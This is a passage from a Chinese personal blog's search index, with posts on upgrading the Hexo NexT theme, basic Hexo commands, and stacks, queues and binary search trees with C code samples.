        <tag>ShadowsocksR</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo next主题更新</title>
    <url>/2020/02/13/hexo-next%E4%B8%BB%E9%A2%98%E6%9B%B4%E6%96%B0/</url>
    <content><![CDATA[<h1 id="hexo-next主题更新"><a href="#hexo-next主题更新" class="headerlink" title="hexo next主题更新"></a>hexo next主题更新</h1><p>next主题设置文档链接：<a href="http://theme-next.iissnan.com/" target="_blank" rel="noopener">http://theme-next.iissnan.com/</a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​        因为我之前用hexo搭建个人博客的时候一直使用的是next主题，不过在最近的一次next主题配置设置的时候，发现配置文件_config.YML中有很多我没有的选项，结果发现我的next版本是5.1.4，现在我要将它更新到7.4。</p>
<p>​        想着next主题更新的话，顺便也可以更新下hexo，但是发现我就是当前最新版4.2.0，那就只更新一下next就行。</p>
<a id="more"></a>

<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ul>
<li>本地保存旧版本数据</li>
<li>下载新版本</li>
<li>更新设置新版本</li>
</ul>
<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>​        直接把next主题配置文件_config.YML复制一份，然后直接把<code>theme/next</code>目录删掉</p>
<p>​        然后从新地址安装最新版 NexT 主题</p>
<p>​        <code>git clone https://github.com/theme-next/hexo-theme-next themes/next</code></p>
<p>​        如果下载很慢 , 或者下载失败 , 也可以直接到 <a href="https://github.com/theme-next/hexo-theme-next下载源文件" target="_blank" rel="noopener">https://github.com/theme-next/hexo-theme-next下载源文件</a> , 点击左侧的 <code>Clone or download</code> , 然后点击 <code>Download ZIP</code> , 下载到本地后 , 在 Hexo 的 <code>\themes</code> 文件夹下创建 <code>next</code> 文件夹 , 然后将 zip 文件解压到这个目录即可</p>
<h2 id="更新配置"><a href="#更新配置" class="headerlink" title="更新配置"></a>更新配置</h2><p>​        对照一下旧版的配置文件和新下载的配置文件修改一下即可。</p>
<h3 id="设置语言"><a href="#设置语言" class="headerlink" title="设置语言"></a>设置语言</h3><p>​        <code>language: zh-cn</code></p>
<h3 id="主题选项"><a href="#主题选项" class="headerlink" title="主题选项"></a>主题选项</h3><p>​        使用Mist主题 <code>scheme: Mist</code></p>
<h3 id="侧边栏社交链接"><a href="#侧边栏社交链接" class="headerlink" title="侧边栏社交链接"></a>侧边栏社交链接</h3><p>​        在<code>social</code>选段中设置，我这边设置了自己的github和Email</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">GitHub:</span> <span class="string">https://github.com/BMooS</span> <span class="string">||</span> <span class="string">github</span></span><br><span class="line"><span class="attr">E-Mail:</span> <span class="string">mailto:slibo921@gmail.com</span> <span class="string">||</span> <span class="string">envelope</span></span><br></pre></td></tr></table></figure>

<h3 id="友链设置"><a href="#友链设置" class="headerlink" title="友链设置"></a>友链设置</h3><p>​        在<code>links</code>选段下，我设置了自己的码云地址</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">links:</span></span><br><span class="line">  <span class="attr">My-gitee:</span> <span class="string">https://gitee.com/BMooS</span></span><br></pre></td></tr></table></figure>

<h3 id="头像设置"><a href="#头像设置" class="headerlink" title="头像设置"></a>头像设置</h3><p>​        在<code>avatar</code>选段下，发现新版本对头像提供了一些新的选项，之后再去研究研究</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">avatar:</span></span><br><span class="line">  <span class="comment"># Replace the default image and set the url here.</span></span><br><span class="line">  <span class="attr">url:</span> <span class="string">https://s2.ax1x.com/2020/01/15/lOIrB4.jpg</span></span><br><span class="line">  <span class="comment"># If true, the avatar will be dispalyed in circle.</span></span><br><span class="line">  <span class="attr">rounded:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># If true, the avatar will be rotated with the cursor.</span></span><br><span class="line">  <span class="attr">rotated:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<h3 id="百度的站长统计"><a href="#百度的站长统计" class="headerlink" title="百度的站长统计"></a>百度的站长统计</h3><p>​        在<code>baidu_analytics</code>选段下，相关的在next文档里有</p>
<h3 id="不蒜子统计"><a href="#不蒜子统计" class="headerlink" title="不蒜子统计"></a>不蒜子统计</h3><p>​        在<code>busuanzi_count</code> 选段下，发现新版只需要开启<code>enable: true</code>就行</p>
<h3 id="footer设置"><a href="#footer设置" class="headerlink" title="footer设置"></a>footer设置</h3><p>​        在<code>footer</code>选项下，注释很好的说明了作用，这里不再说</p>
<h3 id="字数统计"><a href="#字数统计" class="headerlink" title="字数统计"></a>字数统计</h3><p>插件更新</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm uninstall hexo-wordcount</span><br><span class="line">npm install hexo-symbols-count-time --save</span><br></pre></td></tr></table></figure>

<p>配置主题文件</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">symbols_count_time:</span></span><br><span class="line">  <span class="attr">separated_meta:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">item_text_post:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">item_text_total:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">awl:</span> <span class="number">4</span></span><br><span class="line">  <span class="attr">wpm:</span> <span class="number">275</span></span><br></pre></td></tr></table></figure>

<h3 id="加入站内搜索"><a href="#加入站内搜索" class="headerlink" title="加入站内搜索"></a>加入站内搜索</h3><p>插件安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-search --save</span><br></pre></td></tr></table></figure>

<p>找到<code>local_search</code>选段，开启<code>enable: true</code></p>
<h3 id="关于背景动画设置的问题"><a href="#关于背景动画设置的问题" class="headerlink" title="关于背景动画设置的问题"></a>关于背景动画设置的问题</h3><p>关于canvas_nest背景动画</p>
<ol>
<li><p>进入themes/next目录</p>
<ol start="2">
<li><p>执行命令：<br><code>git clone https://github.com/theme-next/theme-next-canvas-nest source/lib/canvas-nest</code></p>
<p>（实际上就是将一个显示动效的js文件clone到对应目录）</p>
</li>
<li><p>这时将配置文件_config.yml中的canvas_nest: false改为canvas_nest: true才能真正生效。</p>
</li>
</ol>
</li>
</ol>
<p>关于three背景动画(3D的，太卡了。。。)</p>
<ol>
<li><p>进入themes/next目录</p>
<ol start="2">
<li><p>执行命令：<br><code>git clone https://github.com/theme-next/theme-next-three source/lib/three</code></p>
<p>（实际上就是将一个显示动效的js文件clone到对应目录）</p>
</li>
<li><p>这时将配置文件_config.yml中的three: false改为three: true才能真正生效。</p>
</li>
</ol>
</li>
</ol>
<p>这是我的canvas_nest设置：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">canvas_nest:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">onmobile:</span> <span class="literal">true</span> <span class="comment"># Display on mobile or not</span></span><br><span class="line">  <span class="attr">color:</span> <span class="string">"0,0,0"</span> <span class="comment"># RGB values, use `,` to separate</span></span><br><span class="line">  <span class="attr">opacity:</span> <span class="number">0.6</span> <span class="comment"># The opacity of line: 0~1</span></span><br><span class="line">  <span class="attr">zIndex:</span> <span class="number">-1</span> <span class="comment"># z-index property of the background</span></span><br><span class="line">  <span class="attr">count:</span> <span class="number">150</span> <span class="comment"># The number of lines</span></span><br></pre></td></tr></table></figure>

<p>还有一些配置更改以后展开，现在还是摸索摸索。</p>
]]></content>
      <categories>
        <category>相关配置</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>next主题</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo相关问题</title>
    <url>/2020/02/13/hexo%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h1 id="hexo"><a href="#hexo" class="headerlink" title="hexo"></a>hexo</h1><p>hexo中文文档链接：<a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">https://hexo.io/zh-cn/docs/</a></p>
<a id="more"></a>



<ol>
<li><p>建站：<code>hexo init &lt;文件夹名称&gt;</code></p>
</li>
<li><p>生成博客：<code>hexo new &quot;md文件名称&quot;</code></p>
<p>生成的博客文件在建站文件夹目录下<code>.\source\_posts</code>目录下</p>
</li>
<li><p>更新： <code>hexo clean</code>           <code>hexo g</code></p>
</li>
<li><p>本地加载：<code>hexo s</code></p>
<p>会加载到<a href="http://localhost:4000/下" target="_blank" rel="noopener">http://localhost:4000/下</a></p>
</li>
<li><p>推到远端： <code>hexo d</code></p>
</li>
<li><p>网站配置信息：在建站文件夹目录下的_config.yml文件</p>
<p>可以在此配置大部分的参数。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>相关配置</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>堆栈和队列</title>
    <url>/2020/02/12/%E5%A0%86%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​        堆栈和队列都是比较基本的数据结构，也是程序员应该掌握的结构，它们简单而又有用，以此，记录一下学习过程。</p>
<a id="more"></a>

<h1 id="堆栈"><a href="#堆栈" class="headerlink" title="堆栈"></a>堆栈</h1><p>​        堆栈是比较基本的ADT(抽象数据类型)，这种结构最鲜明的特点就是List-In First-Out，LIFO方式。</p>
<h2 id="堆栈接口"><a href="#堆栈接口" class="headerlink" title="堆栈接口"></a>堆栈接口</h2><p>​        一般来说，传统的堆栈操作就是push和pop。</p>
<p>​        push就是把一个新值压入到堆栈顶部，pop就是把堆栈顶部的值移出堆栈并返回这个值。堆栈只提供对它顶部元素的访问。</p>
<p>​        但是，用于访问堆栈顶部元素只有pop操作，且这个元素还要被弹出堆栈。</p>
<p>​        所以要使用另一种堆栈接口，其含有三种基本操作push，pop和top：</p>
<p>​        push和传统堆栈一样，而pop只是将堆栈顶的值弹出，并不返回这个值，而top的操作就是返回堆栈顶元素的值，它并不把顶部元素从堆栈中移除。</p>
<p>​        同时，一个空的堆栈不支持pop操作，所以需要一个is_empty函数查看堆栈是否为空，同理，一个满的堆栈不支持push操作，需要一个is_full函数查看堆栈是否为满。</p>
<h2 id="实现堆栈"><a href="#实现堆栈" class="headerlink" title="实现堆栈"></a>实现堆栈</h2><p>​        所有的ADT都必须确定一件事，那就是内存分配，如何获取内存来储存值。有三种可选的方案：静态数组，动态分配的数组，以及动态分配的链式结构。</p>
<p>​        静态数组要求长度固定，而且这个长度在编译使就已经确定。但是这个方案最简单也最不容易出错。</p>
<p>​        动态数组可以在运行时才决定数组的长度。而且，需要的话，可以分配一个新的，更大的数组。把原先的数组的值复制到新的数组中，然后删除掉原先数组，从而达到动态增长数组大小的目的。</p>
<p>​        最后链式结构提供的最大程度上的灵活性。每个元素在需要时候才单独分配，所以除非超过机器内存大小的限制外，这种方式对元素数量没有什么限制。不过，链式结构在访问下一元素的时候需要消耗一定的内存空间，而且在访问一个特定的元素时候的效率不如数组。</p>
<p>下述代码正式用链式结构对堆栈的实现，其他两种同理也可以比较简单的实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 堆栈模块的接口</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STACK_TYPE int <span class="comment">/*堆栈所储存的类型*/</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* push 把一个新值压入到堆栈中 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(STACK_TYPE value)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* pop 从堆栈中弹出一个值，并丢弃 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pop</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* top 返回堆栈顶部元素，但对堆栈不进行修改 */</span></span><br><span class="line"></span><br><span class="line"><span class="function">STACK_TYPE <span class="title">top</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* is_empty 如果堆栈为空，则返回true，否则，返回false */</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_empty</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* is_full 如果堆栈为满，则返回true，否则，返回false */</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_full</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br></pre></td></tr></table></figure>

<p>stack.h文件</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 一个用链表实现的堆栈，这个堆栈没有长度限制。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stack.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 定义一个结构用来储存堆栈元素</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">STACK_NODE</span> &#123;</span></span><br><span class="line">    STACK_TYPE value;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">STACK_NODE</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; StackNode;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 指向堆栈中第一个节点的指针</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">static</span> StackNode *<span class="built_in">stack</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* destroy_stack</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">destroy_stack</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(!is_empty())</span><br><span class="line">        pop();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* push</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(STACK_TYPE value)</span></span>&#123;</span><br><span class="line">    StackNode *new_node;</span><br><span class="line"></span><br><span class="line">    new_node = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(StackNode));</span><br><span class="line">    assert(new_node != <span class="literal">NULL</span>);</span><br><span class="line">    new_node-&gt;value = value;</span><br><span class="line">    new_node-&gt;next = <span class="built_in">stack</span>;</span><br><span class="line">    <span class="built_in">stack</span> = new_node;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* pop</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pop</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    StackNode *first_node;</span><br><span class="line"></span><br><span class="line">    assert(!is_empty());</span><br><span class="line">    first_node = <span class="built_in">stack</span>;</span><br><span class="line">    <span class="built_in">stack</span> = first_node-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(first_node);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* top</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">STACK_TYPE <span class="title">top</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    assert(!is_empty());</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">stack</span>-&gt;value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* is_empty</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_empty</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">stack</span> == <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* is_full</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_full</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h1><p>​        队列同样是比较基本的ADT，这种结构和堆栈不同的是，其特点是First-In First-Out，FIFO方式。</p>
<h2 id="队列接口"><a href="#队列接口" class="headerlink" title="队列接口"></a>队列接口</h2><p>​        事实上队列并没有像堆栈那样具有约定俗成的用法，不过原理上队列都是一样，在这里我们用insert和delete来表示插入和删除，以及队列的方向是从队尾进入，从队首弹出。</p>
<p>​        队列也有insert+delete的用法，以及insert+delete+first的用法，和上述堆栈中差不多，也就不细说了。</p>
<h2 id="实现队列"><a href="#实现队列" class="headerlink" title="实现队列"></a>实现队列</h2><p>​        队列的实现有些和堆栈不同，队列需要两个指针，一个指向队首front，一个指向队尾rear。同时，一般的数组并不适合队列，这是因为队列使用内存的方式引起的。堆栈数据总是扎很于一端，而队列需要对数据进行挪移。</p>
<p>​        在实现队列时，可以用到循环数组实现：</p>
<p><img src="https://s2.ax1x.com/2020/02/13/1qs2z8.png" alt="1qs2z8.png"></p>
<p>再插入一个新的元素就为：</p>
<p><img src="https://s2.ax1x.com/2020/02/13/1qs7iq.png" alt="1qs7iq.png"></p>
<p>这种循环数组很容易实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">rear += <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (rear &gt;= QUEUE_SIZE)</span><br><span class="line">    rear = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<p>或者：</p>
<p><code>rear = (rear + 1) % QUEUE_SIZE</code></p>
<p>同理，对front也是一样的计算。</p>
<p><strong>但是，</strong>这样的循环数组具有一个问题——那就是对队列为空和为满时候两种情况的front和rear是一样的。</p>
<p><img src="https://s2.ax1x.com/2020/02/13/1q6ZcT.png" alt="1q6ZcT.png"></p>
<p>​                                                            向队列中不断添加元素使之为满。</p>
<p><img src="https://s2.ax1x.com/2020/02/13/1q6ja9.png" alt="1q6ja9.png"></p>
<p>​                                                            从队列中不断释放元素使之为空。</p>
<p>​        这样的问题一种解决办法就是设置一个变量，这个变量用于记录队列大小。</p>
<p>​        还有一种解决方法，那就是重新定义 ‘ 满 ‘ 的含义，在队列中插入时剩一个元素的时候就为满了，这样在满的时候和空的时候front和rear的值就不一样了。</p>
<p>​        因为只定义了 ‘ 满 ‘ 的含义，那么队列为空的时候还是原先的判别条件：</p>
<p><code>(rear + 1) % QUEUE_SIZ = front</code></p>
<p>​        队列为满的时候，还保留一个元素未使用，所以在满的时候判别条件就为：</p>
<p> <code>(rear + 2) % QUEUE_SIZE = front</code></p>
<p>​        这样就把这两种情况区分开了。</p>
<p><strong>链表实现</strong></p>
<p>​        上述所说的是队列使用线性结构数组的实现方式，在队列中，还可以使用链式结构——链表去实现，因为是动态分配了新元素的内存，只要不受机器内存大小的限制，理论上队列不存在为满的情况。</p>
<p><img src="https://s2.ax1x.com/2020/02/13/1q4Kte.png" alt="1q4Kte.png"></p>
<pre><code>链表实现图</code></pre>]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>c语言</tag>
        <tag>堆栈</tag>
        <tag>队列</tag>
      </tags>
  </entry>
  <entry>
    <title>二叉搜索树</title>
    <url>/2020/02/06/%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91/</url>
    <content><![CDATA[<h1 id="二叉搜索树"><a href="#二叉搜索树" class="headerlink" title="二叉搜索树"></a>二叉搜索树</h1><blockquote>
<p><strong>树的递归定义：</strong></p>
<p>树是一种数据结构，它要么为空，要么具有一个值并具有零个或多个<strong>孩子</strong>，每个孩子本身也是一个树。</p>
</blockquote>
<a id="more"></a>

<p>二叉树是树的特殊形式，它的每个节点至多有两个孩子，分别称作<strong>左孩子</strong>和<strong>右孩子</strong>。</p>
<p>二叉搜索树还具有一个额外的性质：每个节点的值比它的左子树的所有节点的值都要大，但比它的右子树的所有节点的值都要小。</p>
<p>注意：这个定义排除了树中存在值相同的节点可能</p>
<p>这使得二叉搜索树成为一种用关键值快速查找的工具，它的查找时间复杂度可为<strong>O(log n)</strong>，因为它是用到二分法快速锁定关键值。</p>
<p><img src="https://s2.ax1x.com/2020/02/12/17Ilct.png" alt="17Ilct.png"></p>
<p>​                                                                                （二叉搜索树）</p>
<h2 id="在二叉搜索树的插入"><a href="#在二叉搜索树的插入" class="headerlink" title="在二叉搜索树的插入"></a>在二叉搜索树的插入</h2><p>​    当一个新值添加到一颗二叉搜索树时，它必须被放在合适的位置，继续保持二叉搜索树的属性。</p>
<p>插入的基本算法：</p>
<blockquote>
<p>​    <em>如果树为空：</em></p>
<p>​            <em>把新值作为根节点插入</em></p>
<p>​    <em>否则：</em></p>
<p>​            <em>如果新值小于当前节点的值：</em></p>
<p>​                    <em>把新值插入到当前节点的左子树中</em></p>
<p>​            <em>否则：</em></p>
<p>​                    <em>把新值插入到当前节点的右子树中</em></p>
</blockquote>
<p>上述算法的<strong>递归表达</strong>正是对树的<strong>递归定义</strong>的直接结果。</p>
<p>( 注意：由于上述递归在算法的尾部出现&lt;尾部递归&gt;，所以我们可以用到迭代跟有效的实现这个算法 )</p>
<h2 id="从二叉搜索树删除节点"><a href="#从二叉搜索树删除节点" class="headerlink" title="从二叉搜索树删除节点"></a>从二叉搜索树删除节点</h2><p>​        从树的中部删除一个节点将会导致节点的子树和树的其余部分分离，我们必须重新连接它们。</p>
<p>所以从二叉搜索树删除节点分三种情况：</p>
<ol>
<li>删除节点为叶节点，则直接删除叶节点不会导致任何子树断开，所以不存在重新连接问题。</li>
<li>删除节点只有一个孩子，则删除节点只需要将删除节点的父节点和它的孩子节点连接起来即可。</li>
<li>删除节点具有两个孩子，则其中一种策略是找到该节点左子树的最大值，并将最大值节点删除，同时用这个最大值代替原先要删除那个节点的值。</li>
</ol>
<h2 id="在二叉搜索树中查找"><a href="#在二叉搜索树中查找" class="headerlink" title="在二叉搜索树中查找"></a>在二叉搜索树中查找</h2><p>​        根据二叉搜索树本身特性，则在树中查找值并不困难：</p>
<blockquote>
<p><em>如果树为空：</em></p>
<p>​        <em>这个值不在树中</em></p>
<p><em>否则：</em></p>
<p>​        <em>如果这个值和根节点的值相同:</em></p>
<p>​                <em>成功找到这个值</em></p>
<p>​        <em>否则：</em></p>
<p>​                <em>如果这个值小于根节点的值:</em></p>
<p>​                        <em>查找左子树</em></p>
<p>​                <em>否则：</em></p>
<p>​                        <em>查找右子树</em></p>
</blockquote>
<p>这个递归算法也属于<strong>尾部递归</strong>，所以采用迭代的方案更具效率。</p>
<h2 id="在二叉搜索树中遍历"><a href="#在二叉搜索树中遍历" class="headerlink" title="在二叉搜索树中遍历"></a>在二叉搜索树中遍历</h2><p>​        当你在检查这棵树的所有节点时，就是在遍历这棵树。</p>
<p>​        遍历树的节点有几种不同的遍历方式：前序，中序，后序，以及层次遍历。</p>
<p><img src="https://s2.ax1x.com/2020/02/12/1HU0Wd.png" alt="1HU0Wd.png"></p>
<p>上图所描述的树的前序遍历为：20，12，5，16，25，28 （中-&gt;左-&gt;右）</p>
<p>中序遍历为：5，12，16，20，25，28（左-&gt;中-&gt;右）</p>
<p>后序遍历为：5，16，12，28，25，10（左-&gt;右-&gt;中）</p>
<p>层次遍历为：20，12，25，5，16，28</p>
<h2 id="二叉搜索树的接口文件"><a href="#二叉搜索树的接口文件" class="headerlink" title="二叉搜索树的接口文件"></a>二叉搜索树的接口文件</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">**二叉搜索树的接口</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TREE_TYPE int</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* TreeNode 结构包含了值和两个指向某个树节点的指针</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">TREE_NODE</span> &#123;</span></span><br><span class="line">    TREE_TYPE value;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TREE_NODE</span> *<span class="title">left</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TREE_NODE</span> *<span class="title">right</span>;</span></span><br><span class="line">&#125; TreeNode;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*insert 向树种插入一个新值，参数是需要被添加的值，它必须是树中没有的值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(TREE_TYPE value)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*find 查找一个值，这个值作为参数传递给函数，返回这个值的地址，若无，则返回NULL</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">TREE_TYPE *<span class="title">find</span><span class="params">(TREE_TYPE value)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*max 查找树中最大值，也就是树的最有叶节点的值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">TREE_TYPE <span class="title">max_tree</span><span class="params">(TreeNode *link)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*remove 删除一个值，这个值作为参数传递给函数，它必须是树中具有的值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">remove_value</span><span class="params">(TREE_TYPE value)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*pre_order_traverse</span></span><br><span class="line"><span class="comment">*执行树的前序遍历，参数是一个回调函数指针，它所指向的函数将在树中处理每个节点被调用</span></span><br><span class="line"><span class="comment">*节点的值作为被调函数的参数</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pre_order_traverse</span><span class="params">(<span class="keyword">void</span> (*callback)(TREE_TYPE value))</span></span>;</span><br></pre></td></tr></table></figure>

<p>tree.h文件</p>
<h2 id="二叉搜索树的线性结构"><a href="#二叉搜索树的线性结构" class="headerlink" title="二叉搜索树的线性结构"></a>二叉搜索树的线性结构</h2><p><strong>数组形式的二叉搜索树</strong></p>
<p>用数组形式去实现二叉搜索树的关键是使用下标寻找节点的父节点和孩子节点。</p>
<p>下面有两套映射规则：</p>
<blockquote>
<p><em>基于根节点为节点1，且数组从1开始的映射规则</em></p>
<p>​        节点N的父节点为节点N/2</p>
<p>​        节点N的左孩子节点为节点2N</p>
<p>​        节点N的右孩子节点为节点2N+1</p>
</blockquote>
<blockquote>
<p><em>基于根节点为节点0，且数组从0开始的映射规则</em></p>
<p>​        节点N的父节点为节点(N+1)/2 - 1</p>
<p>​        节点N的左孩子节点为节点2N+1</p>
<p>​        节点N的右孩子节点为节点2N+2</p>
</blockquote>
<p>上述两套规则都可以实现用数组来表示二叉搜索树</p>
<p>​        第一套可读性高，且符合现实习惯，但数组下标从1开始忽略了数组第一个元素的空间，在面对树中储存元素较大时浪费了空间。</p>
<p>​        在用数组实现二叉搜索树时，如何对未使用的数组元素初始化来表示该节点未使用也未赋值，用0表示也是一种方式，但0也是一个合法的数据值，这个时候就可以使用一个比较数组，它的元素是布尔类型，用于提示哪个节点被使用。</p>
<p>​        <strong>缺陷：无论是静态数组，还是动态数组来实现二叉搜索树，都会存在一个问题，那就是面对不是那么平衡树来说，往往会浪费很大的空间，而且每次的新插入会使数组大小扩大一倍，这样使可用空间迅速耗尽。</strong></p>
<h2 id="二叉搜索树的链式结构"><a href="#二叉搜索树的链式结构" class="headerlink" title="二叉搜索树的链式结构"></a>二叉搜索树的链式结构</h2><p>最为常见的二叉搜索树实现方式，代码如下：</p>
